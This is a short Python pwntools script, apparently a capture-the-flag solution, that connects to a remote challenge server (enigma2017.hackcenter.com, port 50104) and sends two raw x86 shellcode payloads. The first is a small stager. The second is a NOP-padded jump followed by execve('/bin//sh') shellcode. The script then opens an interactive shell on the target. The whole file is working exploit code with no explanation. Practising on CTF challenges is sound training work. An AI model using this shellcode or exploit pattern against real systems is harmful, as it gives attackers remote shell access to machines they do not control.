from pwn import * 
 
#p = process('./shellcode2')

p = remote('enigma2017.hackcenter.com',50104)

shellcode2 = "\x90"*4+"\xeb\x15"+"\x90"*24+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

shellcode  = "\x6A\x50\x50\x6A\x00\x68\xBF\x8E\x04\x08\xC3"

print p.recvuntil(':')


p.sendline(shellcode)

p.sendline(shellcode2)

p.interactive()


